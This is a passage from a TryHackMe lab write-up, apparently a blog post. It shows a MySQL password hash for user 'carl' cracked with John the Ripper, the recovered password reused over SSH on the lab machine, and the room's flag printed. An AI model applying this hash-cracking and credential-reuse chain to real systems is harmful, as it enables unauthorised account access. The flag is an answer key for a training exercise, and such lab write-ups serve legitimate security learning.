<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# cat &gt; hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-35-22:~# cat hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-35-22:~# john hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Warning: detected <span style="color:#89dceb">hash</span> <span style="color:#89dceb">type</span> <span style="color:#a6e3a1">&#34;mysql-sha1&#34;</span>, but the string is also recognized as <span style="color:#a6e3a1">&#34;mysql-sha1-opencl&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Use the <span style="color:#a6e3a1">&#34;--format=mysql-sha1-opencl&#34;</span> option to force loading these as that <span style="color:#89dceb">type</span> instead
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>mysql-sha1, MySQL 4.1+ <span style="color:#89dceb;font-weight:bold">[</span>SHA1 256/256 AVX2 8x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Proceeding with single, rules:Single
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Warning: Only <span style="color:#fab387">2</span> candidates buffered <span style="color:#cba6f7">for</span> the current salt, minimum <span style="color:#fab387">8</span> needed <span style="color:#cba6f7">for</span> performance.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Almost <span style="color:#cba6f7">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#cba6f7">if</span> any.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Proceeding with wordlist:/opt/john/password.lst
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Proceeding with incremental:ASCII
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>doggie <span style="color:#89dceb;font-weight:bold">(</span>carl<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>1g 0:00:00:01 DONE 3/3 <span style="color:#89dceb;font-weight:bold">(</span>2024-06-26 06:01<span style="color:#89dceb;font-weight:bold">)</span> 0.5291g/s 1209Kp/s 1209Kc/s 1209KC/s doggie..doggia
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Session completed.</span></span></code></pre></div>
<br>
<p>Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What&rsquo;s the contents of MySQL.txt?</p>






<pre tabindex="0"><code>THM{congratulations_you_got_the_mySQL_flag}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh carl@10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl@10.10.151.196<span style="color:#f38ba8">&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-96-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 05:04:05 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>System load: 0.0 Processes: <span style="color:#fab387">87</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Usage of /: 41.7% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Memory usage: 32% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#fab387">23</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Last login: Thu Apr <span style="color:#fab387">23</span> 12:57:41 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>carl@polomysql:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>carl@polomysql:~$ cat MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>congratulations_you_got_the_mySQL_flag<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>

  </content>
  
  <p>
    
    <a href="/blog/tryhackme/">#TryHackMe</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      

  <span>
    
    Made with
    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
  </span>


    </footer>

    
</body>
</html>
